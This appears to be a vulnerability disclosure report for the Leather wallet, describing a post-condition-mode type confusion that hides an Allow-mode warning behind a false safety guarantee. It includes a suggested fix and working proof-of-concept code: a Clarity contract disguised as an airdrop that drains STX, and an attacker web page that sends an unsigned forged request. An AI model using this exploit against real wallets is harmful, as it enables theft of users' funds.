# Legacy transaction screen shows a false "no transfers from your account" guarantee while broadcasting an Allow-mode transaction (post-condition mode type confusion) — connected dApp can drain STX, tokens and NFTs

## Brief/Intro

Leather's legacy transaction screen checks `postConditionMode` against the numeric `PostConditionMode.Allow` enum, but the value can arrive as the string `"allow"` (what the modern API sends). The mismatch makes the screen hide the Allow-mode warning and show "No transfers (besides fees) will be made from your account or the transaction will abort," while the signer still broadcasts the transaction in Allow mode with no post-conditions. On mainnet a connected dApp can use this to get a user to approve a contract call that drains their STX, tokens, and NFTs while the wallet tells them nothing can leave their account.

## Vulnerability Details

Any web page can send Leather a legacy transaction request. No SDK is needed — the content script listens for a plain DOM event and forwards whatever it gets:

`apps/extension/src/content-scripts/content-script.ts:77`
```ts
document.addEventListener(DomEventName.transactionRequest, ((event: TransactionRequestEvent) => {
  forwardDomEventToBackground({ payload: event.detail.transactionRequest, /* ... */ });
}) as EventListener);
```

The background hands the payload to the legacy handler, which decodes the request token but never verifies it. Every field, including `postConditionMode`, is attacker controlled:

`apps/extension/src/shared/utils/legacy-requests.ts:58`
```ts
export function getLegacyTransactionPayloadFromToken(requestToken: string) {
  const token = decodeToken(requestToken); // decode only, no signature check
  return token.payload as unknown as TransactionPayload;
}
```

The only gate is that the origin has connected before (`transactionRequest` is in `legacyMethodsRequiringConnectedWallet`). There's no schema validation on the legacy payload and no privileged role involved.

On the display side, the mode reaches the UI as the raw value:

`apps/extension/src/app/store/transactions/post-conditions.hooks.ts`
```ts
export function usePostConditionModeState() {
  return useTransactionRequestState()?.postConditionMode; // raw value, can be the string "allow"
}
```

Both places that render post-condition safety UI compare that raw value against the numeric enum. `PostConditionMode.Allow` is `1`, so the string `"allow"` fails both checks. The warning is skipped:

`apps/extension/src/app/features/stacks-transaction-request/post-condition-mode-warning.tsx:13`
```ts
const mode = usePostConditionModeState();
if (mode !== PostConditionMode.Allow) return null; // "allow" !== 1, so the warning never renders
```

And the post-conditions section falls through to the reassuring branch:

`apps/extension/src/app/features/stacks-transaction-request/legacy-post-conditions/post-conditions.tsx:29`
```ts
if (!postConditions || !pendingTransaction) return <></>; // postConditions is [], which is truthy — no early return
if (!IS_TEST_ENV && mode === PostConditionMode.Allow) return null; // "allow" === 1 is false — falls through
// ...
return <NoPostConditions />; // renders the lock + false guarantee
```

`no-post-conditions.tsx:15` is the copy the user sees: a lock icon next to "No transfers (besides fees) will be made from your account or the transaction will abort."

The signer takes the same string and builds the transaction with it:

`apps/extension/src/app/common/transactions/stacks/generate-unsigned-txs.ts:59`
```ts
postConditionMode: postConditionMode ?? PostConditionMode.Deny, // raw "allow" passed to makeUnsignedContractCall
```

With the pinned `@stacks/transactions@7.5.0` (`apps/extension/package.json:86`), that produces an Allow-mode transaction:

```
PostConditionMode = { Allow: 1, Deny: 2, Originator: 3 }
makeUnsignedContractCall({ postConditionMode: 'allow' }).postConditionMode === 1  // Allow
```

The root cause is that the legacy path never normalises the string. Leather already knows the string form exists and handles it correctly on the modern RPC path:

`apps/extension/src/app/common/transactions/stacks/post-condition.utils.ts:24`
```ts
export function rpcPostConditionModeToEnum(mode?: PostConditionModeName) {
  if (mode === 'allow') return PostConditionMode.Allow;
  // ...
}
```

The legacy display just doesn't call it, so the screen and the signer disagree about whether the transaction is protected.

## Impact Details

Impacts selected (all Critical), primary first:

1. Tampering with transactions between user approval and signing/broadcast (the signed transaction differs from what was displayed and approved). What the user was shown and approved was a transaction represented as unable to move their funds ("No transfers … will be made from your account or the transaction will abort"). What was signed and broadcast was `post_condition_mode: allow` with zero post-conditions — a transaction that drained 2 STX. The signed transaction differs from what was displayed in the one field that decides whether funds can move.
2. Malicious interactions with an already-connected wallet (submitting malicious transactions). A connected origin submits a contract call that the wallet presents under a false safety guarantee, which is what causes the victim to approve it.
3. Direct theft or loss of user funds resulting from a vulnerability in the Leather wallet software that causes unauthorized signing, authorization, or broadcast of a transaction.

In Allow mode the runtime does not enforce post-conditions, so a contract running with the victim as `tx-sender` can move anything the victim holds:

- STX, via `(stx-transfer? amount tx-sender attacker)` (this is what the PoC does).
- SIP-010 tokens, via `(contract-call? .token transfer amount tx-sender attacker none)` — SIP-010 `transfer` checks `(is-eq tx-sender sender)`, and `tx-sender` is the victim.
- SIP-009 NFTs, the same way.

So the ceiling is the entire STX, token and NFT balance of the signing account, whatever the contract decides to take. It's irreversible once broadcast. This is not the out-of-scope "approving after a clear and accurate confirmation screen": the screen is not accurate. It tells the user nothing will leave their account and hides the warning that exists specifically for this case, and the modern path handles the same input correctly, so it's a wallet bug rather than user error.

On reachability: the legacy gate reads `appPermissions[hostname].requestedAccounts`, and that flag is set by the ordinary modern connect flow — `useAppPermissions().hasRequestedAccounts()` writes it during `getAddresses` / `stx_getAddresses` (`app-permissions.hooks.ts:20`). So any dApp a user has connected to through the current RPC API can already reach this; the user never had to touch the legacy API. An attacker's own page can also just prompt a normal connection and then fire the legacy request in the same session. No phishing, no seed handling, no special permissions.

## References

- Content script listener: https://github.com/leather-io/mono/blob/dev/apps/extension/src/content-scripts/content-script.ts#L77
- Unverified token decode: https://github.com/leather-io/mono/blob/dev/apps/extension/src/shared/utils/legacy-requests.ts#L58
- Warning skipped on numeric compare: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/features/stacks-transaction-request/post-condition-mode-warning.tsx#L13
- Falls through to NoPostConditions: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/features/stacks-transaction-request/legacy-post-conditions/post-conditions.tsx#L29
- False guarantee copy: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/features/stacks-transaction-request/legacy-post-conditions/no-post-conditions.tsx#L15
- Signer passes raw mode: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/common/transactions/stacks/generate-unsigned-txs.ts#L59
- Modern normaliser the legacy path skips: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/common/transactions/stacks/post-condition.utils.ts#L24
- Connect flow sets requestedAccounts: https://github.com/leather-io/mono/blob/dev/apps/extension/src/app/store/app-permissions/app-permissions.hooks.ts#L20
- `@stacks/transactions` pin: https://github.com/leather-io/mono/blob/dev/apps/extension/package.json#L86
- Deploy tx (testnet): https://explorer.hiro.so/txid/0x22158cda259aef804d67daaa0eb2f89d55ebde873785a089537de11f5120bd2a?chain=testnet
- Drain tx (testnet, post_condition_mode allow, 2 STX moved): https://explorer.hiro.so/txid/0xfc4d2b71b11945d32caaa2c4bb7d39cddc4a554854964ff97c6723b10ac31b4f?chain=testnet

## Proof of Concept

Reproduced on the published Chrome Web Store extension (v6.107.0) with a testnet wallet. Funds moved on chain.

Fix: normalise `postConditionMode` to the enum on the legacy path (reuse `rpcPostConditionModeToEnum`) or compare the display guards against the normalised value like the modern path does, and reject unknown values. Add a regression test that a legacy `contract_call` with `postConditionMode: "allow"` shows the Allow warning and does not render `NoPostConditions`.

1. Malicious contract on testnet (`airdrop-poc.clar`). Looks like an airdrop; drains the caller's STX:

```clarity
(define-constant attacker 'STD2QFCZ5A6Y91H8781XVAGDPKRXQZVEPR6D4X7B)
(define-constant drain-amount u2000000) ;; 2 STX
(define-public (claim-airdrop)
  (stx-transfer? drain-amount tx-sender attacker)) ;; aborts under Deny, succeeds under Allow
```

2. Attacker page (`leather-postcondition-allow-poc.html`) connects with `getAddresses`, then calls `LeatherProvider.transactionRequest(jwt)`. The JWT is built by hand (`base64url(header) + "." + base64url(payload) + "." + "AA"`) since Leather only decodes it. Payload:

```json
{ "txType": "contract_call", "contractAddress": "<attacker contract>", "contractName": "airdrop-poc",
  "functionName": "claim-airdrop", "functionArgs": [], "postConditionMode": "allow",
  "postConditions": [], "network": "testnet" }
```

3. What the popup shows: contract `ST9R...B8NK.airdrop-poc` → `claim-airdrop`, the lock icon with "No transfers (besides fees) will be made from your account or the transaction will abort", and no "this transaction can transfer any of your assets" warning.

4. Approve. On-chain result, drain tx `0xfc4d2b71b11945d32caaa2c4bb7d39cddc4a554854964ff97c6723b10ac31b4f`:
   - `tx_status: success`, `post_condition_mode: allow`, `post_conditions: []`
   - STX transfer event: 2.0 STX from `ST9R7QJQA1TJ664YRCHW8HYTSXV1QE3RGZP2B8NK` to `STD2QFCZ5A6Y91H8781XVAGDPKRXQZVEPR6D4X7B`
   - Balances: victim 499.50 → 497.50 STX, attacker 0 → 2.0 STX

The transaction the wallet described as "No transfers will be made from your account" is on chain in Allow mode with no post-conditions, and it moved the victim's STX to the attacker.

There's also a standalone check (`verify-postcondition-allow.js`) that runs the same code paths with the pinned libraries and prints the mismatch — the display logic reads the string as not-Allow while `makeUnsignedContractCall` builds it as Allow:

```
npm i @stacks/transactions@7.5.0 jsontokens@4.0.1 && node verify-postcondition-allow.js
payload.postConditionMode : "allow" (string)
DISPLAY warning shown : false
DISPLAY lock + "No transfers from your account" : true
SIGNED tx.postConditionMode : 1 (Allow)
```

One thing worth noting for triage, since the `IS_TEST_ENV` build could be raised as an explanation for the lock panel: `PostConditionModeWarning` has no `IS_TEST_ENV` guard, so for a numeric Allow the warning renders in every build, test or not. The screen in this report has the warning absent and the lock panel present at the same time, which can only happen with the string form on a normal build. The screenshot captures both in one frame.

Attachments: `verify-postcondition-allow.js`, `leather-postcondition-allow-poc.html`, `airdrop-poc.clar`, the popup screenshot, and the two explorer links above.

### Full PoC source

`airdrop-poc.clar` (deploy on testnet; set the page's `contractAddress`/`contractName` to your deployed contract):

```clarity
;; airdrop-poc — looks like an airdrop, drains the caller's STX in Allow mode.
;; Aborts under Deny (no post-condition authorizes the transfer); succeeds under Allow.
(define-constant attacker 'STD2QFCZ5A6Y91H8781XVAGDPKRXQZVEPR6D4X7B)
(define-constant drain-amount u2000000) ;; 2 STX
(define-public (claim-airdrop)
  (stx-transfer? drain-amount tx-sender attacker))
```

`leather-postcondition-allow-poc.html` — serve over http/https (e.g. `python3 -m http.server`) so the extension injects its provider, connect, then fire:

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Leather PoC — postConditionMode "allow" deceptive confirmation</title>
</head>
<body>
  <h1>Leather PoC — legacy transactionRequest with string postConditionMode: "allow"</h1>
  <button id="connect">Connect Leather</button> <span id="connStatus"></span>
  <button id="attack">Claim "free airdrop" (sends postConditionMode:"allow")</button>
  <pre id="payloadView"></pre>
  <div id="log"></div>
<script>
// dependency-free JWT — Leather only decodeToken()'s it; the signature is never verified.
function b64url(obj) {
  return btoa(JSON.stringify(obj)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function makeUnsignedJwt(payload) {
  return b64url({ typ: 'JWT', alg: 'ES256K' }) + '.' + b64url(payload) + '.' + 'AA';
}

const maliciousPayload = {
  txType: 'contract_call',
  contractAddress: 'ST9R7QJQA1TJ664YRCHW8HYTSXV1QE3RGZP2B8NK', // your deployed airdrop-poc
  contractName: 'airdrop-poc',
  functionName: 'claim-airdrop',
  functionArgs: [],
  postConditionMode: 'allow', // STRING form — the exploit
  postConditions: [],
  network: 'testnet',
  publicKey: '03ef2340541b4d0e0a4c1c6e6f5a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4',
  appDetails: { name: 'Free Airdrop', icon: location.origin + '/icon.png' },
};
document.getElementById('payloadView').textContent = JSON.stringify(maliciousPayload, null, 2);

function log(msg) {
  const d = document.createElement('pre');
  d.textContent = msg;
  document.getElementById('log').appendChild(d);
}
function provider() {
  return window.LeatherProvider || window.StacksProvider || window.btc;
}

document.getElementById('connect').onclick = async () => {
  const p = provider();
  if (!p) { document.getElementById('connStatus').textContent = ' — Leather not detected'; return; }
  try {
    const res = await p.request('getAddresses'); // modern connect sets the requestedAccounts flag the legacy gate reads
    document.getElementById('connStatus').textContent = ' — connected';
    log('Connected: ' + JSON.stringify(res?.result?.addresses?.map(a => a.address) ?? res));
  } catch (e) {
    document.getElementById('connStatus').textContent = ' — ' + (e?.error?.message || e);
  }
};

document.getElementById('attack').onclick = async () => {
  const p = provider();
  if (!p) { log('Leather not detected.'); return; }
  const token = makeUnsignedJwt(maliciousPayload);
  log('Dispatching legacy transactionRequest with postConditionMode="allow" (string)…');
  try {
    // Either the provider method or a raw CustomEvent works — the content script listens for the event.
    if (typeof p.transactionRequest === 'function') {
      await p.transactionRequest(token);
    } else {
      document.dispatchEvent(new CustomEvent('hiroWalletStacksTransactionRequest', {
        detail: { transactionRequest: token },
      }));
    }
    log('Request sent. Observe the approval popup.');
  } catch (e) {
    log('Result: ' + (e?.message || JSON.stringify(e)));
  }
};
</script>
</body>
</html>
```

`verify-postcondition-allow.js` — standalone check against the pinned libraries (`npm i @stacks/transactions@7.5.0 jsontokens@4.0.1 && node verify-postcondition-allow.js`):

```js
const { TokenSigner, decodeToken } = require('jsontokens');
const { PostConditionMode, makeUnsignedContractCall } = require('@stacks/transactions');

// Attacker: malicious connected dApp builds the legacy request JWT (signature never checked by Leather).
const maliciousPayload = {
  txType: 'contract_call',
  contractAddress: 'SP000000000000000000002Q6VF78',
  contractName: 'evil-drainer',
  functionName: 'claim-airdrop',
  functionArgs: [],
  postConditionMode: 'allow', // STRING form is the exploit
  postConditions: [],
  network: 'mainnet',
  publicKey: '03ef2340541b4d0e0a4c1c6e6f5a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4',
};
const requestToken = new TokenSigner('ES256K', 'a'.repeat(64)).sign(maliciousPayload, false);

(async () => {
  // Leather: decode (no verification), read raw mode, run display + sign logic.
  const payload = decodeToken(requestToken).payload;              // legacy-requests.ts:58
  const mode = payload.postConditionMode;                         // post-conditions.hooks.ts

  const allowWarningShown = !(mode !== PostConditionMode.Allow);  // post-condition-mode-warning.tsx:13 -> false (suppressed)
  const rendersProtected = !(mode === PostConditionMode.Allow);   // post-conditions.tsx:30 -> true (shows "protected")

  const tx = await makeUnsignedContractCall({                     // generate-unsigned-txs.ts:59
    contractAddress: payload.contractAddress, contractName: payload.contractName,
    functionName: payload.functionName, functionArgs: [], publicKey: payload.publicKey,
    fee: 1000, nonce: 0,
    postConditionMode: mode ?? PostConditionMode.Deny,
    postConditions: [], network: 'mainnet',
  });

  console.log('payload.postConditionMode :', JSON.stringify(mode), `(${typeof mode})`);
  console.log('DISPLAY "can transfer any asset" warning shown :', allowWarningShown);
  console.log('DISPLAY lock + "No transfers from your account" :', rendersProtected);
  console.log('SIGNED  tx.postConditionMode                    :', tx.postConditionMode,
              tx.postConditionMode === PostConditionMode.Allow ? '(ALLOW — unprotected)' : '(Deny/other)');
  console.log('\nCONTRADICTION CONFIRMED :',
              rendersProtected && !allowWarningShown && tx.postConditionMode === PostConditionMode.Allow);
})();
```

### On-chain evidence (testnet)

- Extension tested: v6.107.0 (current Chrome Web Store build). Network: Stacks testnet.
- Contract: `ST9R7QJQA1TJ664YRCHW8HYTSXV1QE3RGZP2B8NK.airdrop-poc`
- Victim / deployer: `ST9R7QJQA1TJ664YRCHW8HYTSXV1QE3RGZP2B8NK`
- Attacker sink: `STD2QFCZ5A6Y91H8781XVAGDPKRXQZVEPR6D4X7B`

Deploy transaction:
- txid `0x22158cda259aef804d67daaa0eb2f89d55ebde873785a089537de11f5120bd2a` (`tx_status: success`)
- https://explorer.hiro.so/txid/0x22158cda259aef804d67daaa0eb2f89d55ebde873785a089537de11f5120bd2a?chain=testnet

Drain transaction (the approved `claim-airdrop` call):
- txid `0xfc4d2b71b11945d32caaa2c4bb7d39cddc4a554854964ff97c6723b10ac31b4f`
- `tx_status: success`, `post_condition_mode: allow`, `post_conditions: []`
- STX transfer event: 2.0 STX `ST9R7QJQA1TJ664YRCHW8HYTSXV1QE3RGZP2B8NK` → `STD2QFCZ5A6Y91H8781XVAGDPKRXQZVEPR6D4X7B`
- https://explorer.hiro.so/txid/0xfc4d2b71b11945d32caaa2c4bb7d39cddc4a554854964ff97c6723b10ac31b4f?chain=testnet

Balances before/after the drain:
- Victim `ST9R…B8NK`: 499.50 STX → 497.50 STX
- Attacker `STD2…4X7B`: 0 STX → 2.0 STX

The wallet described this transaction as "No transfers will be made from your account," yet it broadcast in Allow mode with no post-conditions and moved the victim's STX to the attacker.

JSON confirmation of the drain tx is available from the public API for independent verification:
`https://api.testnet.hiro.so/extended/v1/tx/0xfc4d2b71b11945d32caaa2c4bb7d39cddc4a554854964ff97c6723b10ac31b4f` (fields `post_condition_mode: "allow"`, `post_conditions: []`, and the `stx_asset` transfer event).
